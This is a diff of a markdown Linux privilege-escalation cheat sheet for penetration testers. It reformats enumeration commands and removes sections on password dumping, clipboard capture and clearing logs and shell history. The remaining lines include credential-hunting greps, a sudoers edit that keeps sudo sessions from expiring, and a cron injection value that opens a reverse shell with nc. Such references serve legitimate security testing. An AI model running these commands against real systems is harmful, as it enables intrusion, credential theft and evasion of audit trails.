@@ -49,23 +49,19 @@ For more information about that technique refer to [T1068 - Exploitation for Pri
 > / / / To Finish
 
 ```bash
-cat /etc/resolv.conf          # Display DNS resolver(s)
-cat /etc/sysconfig/network    # Displays global network settings
-cat /etc/networks             # Displays network names
-cat /etc/squid.conf           # Displays squid proxy config
-ifconfig                      # Displays network interface
-iwconfig                      # Displays wireless network interface
-iptables -L                   # List all rules of all chains
-dnsdomainname                 # Displays the system's DNS domain name
-arp -e                        # Displays the ARP cache
-ip neigh                      # Displays ARP table on new system
-route                         # Displays the routing table
-netstat -antlup               # Display all TCP,UDP listening and non-listening ports with their associated PID
-ss -anp                       # Dumps socket statistics and displays information
-ss -tp
-lsof -i                       # listing of all Internet and x.25 (HP-UX) network opened files.
-ip xfrm state list            # Print out the list of existing state in xfrm
-/var/log/messages I grep DHCP # List DHCP assignments 
+cat /etc/resolv.conf       # Display DNS resolver(s)
+cat /etc/sysconfig/network # Displays global network settings
+cat /etc/networks          # Displays network names
+cat /etc/squid.conf        # Displays squid proxy config
+ifconfig                   # Displays network interface
+iwconfig                   # Displays wireless network interface
+iptables -L                # List all rules of all chains
+dnsdomainname              # Displays the system's DNS domain name
+arp -e                     # Displays the ARP cache
+ip neigh                   # Displays ARP table on new system
+route                      # Displays the routing table
+netstat -antlup            # Display all TCP,UDP listening and non-listening ports with their associated PID
+ss -anp                    # Dumps socket statistics and displays information
 ```
 
 Also check if tcpdump is available, you could maybe sniff some interesting things.
@@ -84,14 +80,9 @@ Note that within *squid.conf*, we could find:
 
 - domain names
 - cachemgr_passwd directive, which allows you to protect cache manager pages with a password (cleartext)
-  &rarr; curl -s --user ';PASSWORD' <http://IP/squid-internal-mgr/menu> | grep -v "disabled"
-  &rarr; curl -s --user ';PASSWORD' <http://IP/squid-internal-mgr/fqdncache>
+  &rarr; curl -s --user ';PASSWORD' http://IP/squid-internal-mgr/menu | grep -v "disabled"
+  &rarr; curl -s --user ';PASSWORD' http://IP/squid-internal-mgr/fqdncache
 - Addtional information about the subnet
-
-###### *If you don't know, now you know: [XFRM](http://manpages.ubuntu.com/manpages/trusty/man8/ip-xfrm.8.html)
-
-xfrm is an IP framework for transforming packets (such as encrypting their payloads).
-This framework is used to implement the IPsec protocol suite (with the state  object operating on  the Security Association  Database, and the policy object operating on the Security Policy Database). It is also used for the IP Payload Compression Protocol and features of Mobile IPv6.
 
 ###### Binairies
 
@@ -103,18 +94,6 @@ It may be usefull to know if the following software are availables
 
 ```bash
 which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc rkt kubectl 2>/dev/null
-```
-
-###### Screen from Xll
-
-[xwd](https://linux.die.net/man/1/xwd) dump an image of an X window.
-[xwud](https://linux.die.net/man/1/xwud) is a mage displayer for X,
-
-```bash
-# Capture a screenshot in "XWD X Window Dump image data" format
-xwd -root -out /tmp/test.xpm
-# Conver the image to png
-convert /tmp/test.xpm -resize 1280x1024 /tmp/test.jpg
 ```
 
 ###### Others
@@ -133,6 +112,7 @@ grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab 2>/d
 grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/mtab 2>/dev/null
 lpstat -a # Displays status information about the current classes, jobs, and printers
 ls -alh /var/mail/ # Displays the contents of the mail directory
+lsof -i # listing of all Internet and x.25 (HP-UX) network opened files.
 date 2>/dev/null # Date
 lscpu # CPU info
 lsmod # Display which loadable kernel modules are currently loaded. You can then use modinfo on those module
@@ -207,42 +187,6 @@ locate password | more
   ```
 
 - **.git**: cc [Files101](Files101.md)
-
-[Mimipenguin](https://github.com/huntergregal/mimipenguin) is a tool used to dump the login password from the current linux desktop user.
-Mimipenguin requires root permissions.
-It can retreive the following passwords from:
-
-- GDM password
-- Gnome Keyring
-- LightDM
-- VSFTPd (Active FTP Connections)
-- Apache2 (Active HTTP Basic Auth Sessions)
-- OpenSSH (Active SSH Sessions - Sudo Usage)
-
-For more information about those techniques refer to:
-
-- [T1552.001 - Unsecured Credentials: Credentials In Files](https://attack.mitre.org/techniques/T1552/001/)
-- [T1552.003 - Unsecured Credentials: Bash History](https://attack.mitre.org/techniques/T1552/001/)
-- [T1552.004 - Unsecured Credentials: Private Keys](https://attack.mitre.org/techniques/T1552/004/)
-
-##### Clipboard
-
-[xclip](https://linux.die.net/man/1/xclip) command line interface to X selections (clipboard)
-
-[xsel](https://linux.die.net/man/1/xsel) manipulate the X selection.
-
-```bash
-if [ `which xclip 2>/dev/null` ]; then
-    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
-    echo "Highlighted text: "`xclip -o 2>/dev/null`
-  elif [ `which xsel 2>/dev/null` ]; then
-    echo "Clipboard: "`xsel -ob 2>/dev/null`
-    echo "Highlighted text: "`xsel -o 2>/dev/null`
-  else echo "Not found xsel and xclip"
-  fi
-```
-
-For more information about that technique refer to [T1115 - Clipboard Data](https://attack.mitre.org/techniques/T1115/)
 
 ##### Authentication Logs
 
@@ -408,20 +352,6 @@ tmux -S /tmp/dev_sess attach -t 0
 
 ### Defense Enumeration
 
-#### Commands to know
-
-```bash
-echo "" /var/log/auth.log        # Clear auth.log file
-echo "" ~/.bash_history          # Clear current user bash history
-rrn ~/.bash_history -rf          # Delete .bash_history file
-history -c                       # Clear current session history
-export HISTFILESIZE=0            # Set history max lines to 0
-export HISTSIZE=0                # Set history max commands to 0
-unset HISTFILE                   # Disable history logging (need to logout to take effect)
-kill -9 $$                       # Kills current session
-ln /dev/null ~/.bash_history -sf # Permanently send all bash history commands to /dev/null 
-```
-
 **Security-Enhanced Linux (SELinux)** is a Linux kernel security module that provides a mechanism for supporting access control security policies, including mandatory access controls (MAC).
 
 ```bash
@@ -442,16 +372,10 @@ cat /etc/passwd # Enumerate users (via /etc/passwd)
 cat /etc/passwd | egrep -e '/bin/(ba)?sh' # Enumerate users that has shell access
 ```
 
-#### Group Membership Privilege Escalation
+#### Group Membership Privigele Escalation
 
 ```bash
 id # Print real and effective user and group IDs
-```
-
-Some Linux were affected by a bug that when the User ID was superior to INT_MAX, you could escalate privileges,
-
-```bash
-systemd-run -t /bin/bash
 ```
 
 ##### Shadow
@@ -494,8 +418,6 @@ Then open screenshot.raw with Gimp and specify the Width and Height
 
 <https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#video-group>
 
-For more information about that technique refer to [T1113 - Screen Capture](https://attack.mitre.org/techniques/T1113/)
-
 ##### ADM Group
 
 This group allows you to view logs in /var/log.
@@ -508,12 +430,6 @@ zgrep "authen" access.log*              # Search out "authen" within access.log 
 zgrep "pass" access.log*                # Search out "pass" within access.log compressed file
 grep -d recurse "pass" /var/log/*       # Search out "pass" within all files in /var/log
 ```
-
-Here are some interesting logs:
-
-- **/var/log/faillog**: Failure log database
-- **lpr.log**: LP Print Service logs
-- **var/log/mysql.**: MySQL logs
 
 ##### Wheel Group
 
@@ -633,8 +549,6 @@ If set to a value less than 0 the user's time stamp will not expire until the sy
 sudo sed -i 'timestamp_timeout=-1/' /etc/sudoers
 ```
 
-For more information about that technique refer to [T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching](https://attack.mitre.org/techniques/T1548/003/)
-
 https://github.com/7CA700B53CA3/atomic-red-team-pre-subtechniques/blob/d591d963b6e88caec70d33f388299107d05c7a73/atomics/T1206/T1206.md
 
 #### Sudo Killer (Tool)
@@ -710,8 +624,6 @@ Cron examines all stored crontabs and checks each job to see if it needs to be r
 2. Search for wildcard injection vulnerability such as tar, chown and chmod (cc Wildcard)
 3. Search for execution within the script that use a folder or file that can be changed to '; nc -c bash IP PORT
 
-For more information about that technique refer to [T1053.003 - Scheduled Task/Job: Cron](https://attack.mitre.org/techniques/T1053/003/)
-
 #### $PATH
 
 ```bash
@@ -721,16 +633,6 @@ echo $PATH
 If you notice '.' in environment PATH variable it means that the logged user can execute binaries/scripts from the current directory and it can be an excellent technique for an attacker to escalate root privilege.
 
 For more information about that technique refer to [T1574.007 - Hijack Execution Flow: Path Interception by PATH Environment Variable](https://attack.mitre.org/techniques/T1574/007/)
-
-#### Systemd PATH
-
-We can dump the systemd manager environment block. This is the environment block that is passed to all processes the manager spawns.
-
-```bash
-systemctl show-environment
-```
-
-Same principle as $PATH, but for systemd services.
 
 ###### *If you don't know, now you know: [PATH](https://en.wikipedia.org/wiki/PATH_(variable))*
 
@@ -848,14 +750,11 @@ Inotify can be used to monitor individual files, or to monitor directories.
 ps -aef --forest
 ps -aef --forest | grep "root"
 top
-service --status-all # Try to figure out for every init script in /etc/init.d if it supports a status command
-chkconfig --list #  List all available services and view or update their run level settings.
+cat /etc/services
 ps aux | grep root # Displays services run by root
 ps -ef | grep root # Displays services run by root
 ss -lnpt # Dumps socket statistics
 ```
-
-For more information about that technique refer to [T1057 - Process Discovery](https://attack.mitre.org/techniques/T1057/)
 
 #### Dumping memory
 
@@ -895,6 +794,7 @@ ls -alh /usr/local/bin/  # Displays all the content of /usr/local/
 dpkg -l # Displays all Debian based packages
 rpm -qa # Displays all RedHat based packages
 ```
+
 
 ### Linux Capabilities
 
